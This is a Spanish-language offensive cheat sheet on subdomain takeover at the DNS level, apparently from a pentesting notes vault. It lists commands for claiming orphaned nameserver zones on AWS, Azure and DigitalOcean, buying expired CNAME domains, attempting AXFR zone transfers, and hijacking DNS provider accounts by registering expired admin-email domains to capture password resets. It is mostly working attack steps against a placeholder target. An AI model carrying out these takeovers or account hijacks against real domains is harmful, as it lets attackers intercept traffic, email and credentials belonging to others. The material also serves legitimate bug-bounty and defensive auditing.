---
aliases:
  - NS Takeover
  - Nameserver Takeover
  - DNS-Level Takeover
  - Expired Domain
tags:
  - type/technique
  - vuln/subdomain-takeover
  - technique/initial-access
  - asset/dns
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Subdomain Takeover]]"
---
# Subdomain Takeover - NS Takeover y DNS-Level

***

## Nameserver Takeover (NS Records)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `dig +short NS dev.target.com` | Lista NS records del subdomain | Pre-attack recon. |
| `dig +short NS dev.target.com \| grep -iE 'awsdns\|azure-dns\|googledomains\|digitalocean\|dnsimple'` | Identificar provider NS | Determine takeover surface. |
| `for ns in $(dig +short NS dev.target.com); do dig +short A "$ns"; done` | Verificar NS provider reachable | Validation. |
| `aws route53 create-hosted-zone --name dev.target.com --caller-reference $(date +%s)` | Reclama Route53 hosted zone | AWS NS takeover. |
| `doctl compute domain create dev.target.com` | Reclama DigitalOcean DNS zone | DO NS takeover. |
| `az network dns zone create -g rg -n dev.target.com` | Reclama Azure DNS zone | Azure NS takeover. |
| `aws route53 change-resource-record-sets --hosted-zone-id $ZID --change-batch '{"Changes":[{"Action":"CREATE","ResourceRecordSet":{"Name":"dev.target.com","Type":"A","TTL":60,"ResourceRecords":[{"Value":"1.2.3.4"}]}}]}'` | Setear A record post-claim | Full subdomain DNS control. |
| `dig @ns1.attacker.com dev.target.com` | Verificar respuesta del propio NS | Post-takeover validation. |
^sdt-ns-takeover

### NS takeover workflow

```bash
SUB="dev.target.com"
dig +short NS "$SUB"
# Output: ns1.cloud-provider.com, ns2.cloud-provider.com

for ns in $(dig +short NS "$SUB"); do
  echo "$ns:"
  dig +short A "$ns"
done

# Si NS provider permite crear zonas con same name:
aws route53 create-hosted-zone --name "$SUB" --caller-reference "$(date +%s)"
# AWS asigna NS aleatorio — repetir hasta match

# Post-claim: DNS responses controlled
```

___

## Expired Domain Reclaim

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `dig +short CNAME victim.target.com` | Identificar CNAME a third-party | Pre-attack recon. |
| `whois cname-target.com \| grep -iE 'expir\|status'` | Verificar expiración | Status check. |
| `whois cname-target.com \| awk -F': ' '/Expir/{print $2}'` | Extraer fecha exacta | Timeline planning. |
| Browser → namejet.com / godaddy auctions / dropcatch.com → buscar dominio | Comprar pre-drop o post-drop | Auction sites. |
| `for sub in $(cat subs.txt); do C=$(dig +short CNAME "$sub"); [ -n "$C" ] && ! dig +short A "$C" \| grep -q '[0-9]' && echo "[!] $sub → $C dangling"; done` | Bulk detect CNAMEs apuntando a hosts no resolviéndose | Discovery automation. |
| `domain-monitor --watch target-cname.com --alert me@email` | Alerta cuando dominio expira | Bug bounty automation. |
| Post-purchase: `whois target-cname.com` para verificar nuevo owner | Confirmación takeover | Validation. |
^sdt-ns-expired

### Expired domain detection

```bash
for sub in $(cat subs.txt); do
  CNAME=$(dig +short CNAME "$sub")
  if [ -n "$CNAME" ] && [[ ! "$CNAME" == *"target.com"* ]]; then
    if ! dig +short A "$CNAME" | grep -q '[0-9]'; then
      echo "[!] Possible takeover: $sub → $CNAME (dangling)"
      DOMAIN=$(echo "$CNAME" | awk -F. '{print $(NF-1)"."$NF}')
      whois "$DOMAIN" | grep -iE 'expir|status'
    fi
  fi
done
```

___

## SOA / NS Misconfig

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `dig SOA target.com` | SOA record — buscar inconsistencias | Recon. |
| `dig SOA dev.target.com` (subdomain) | SOA missing/mismatch | Stale config indicator. |
| `dig NS target.com` y `dig +trace target.com` | Comparar authoritative vs glue records | Lame delegation detection. |
| `dig AXFR @ns1.target.com target.com` | Zone transfer attempt | AXFR allowed → full zone enum. |
| `for ns in $(dig +short NS target.com); do dig AXFR @"$ns" target.com; done` | Bulk AXFR attempts | Discovery. |
| `dig +short A subdomain.target.com` y comparar con `host -t A subdomain.target.com` (different resolvers) | Inconsistent resolution | Glue record stale. |
| `dig +dnssec target.com \| grep RRSIG` | DNSSEC chain verification | DNSSEC misconfig check. |
| `dnsrecon -d target.com -t axfr` | Auto AXFR + bruteforce | Combined recon. |
^sdt-ns-misconfig

___

## DNS Provider Account Orphan

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `whois target.com \| grep -iE 'email\|mail\|admin'` | Admin emails en WHOIS | OSINT pre-attack. |
| `for email in $(extract_admin_emails); do DOMAIN=$(echo "$email" \| cut -d@ -f2); whois "$DOMAIN" \| grep -i expir; done` | Verificar dominios admin emails | Email squatting candidates. |
| Browser → register expired admin email domain | Reclamar dominio email | Foundation. |
| Set MX record + receive email | Recibir password resets | Post-domain claim. |
| Browser → cloudflare.com / aws.amazon.com → password reset → use captured email | Reset DNS provider account password | Account hijack. |
| Post-hijack: edit zone records via web console | Subdomain takeover masivo | Full DNS control. |
| `theHarvester -d target.com -b all` | OSINT extra emails | Account discovery. |
^sdt-ns-account-orphan

***
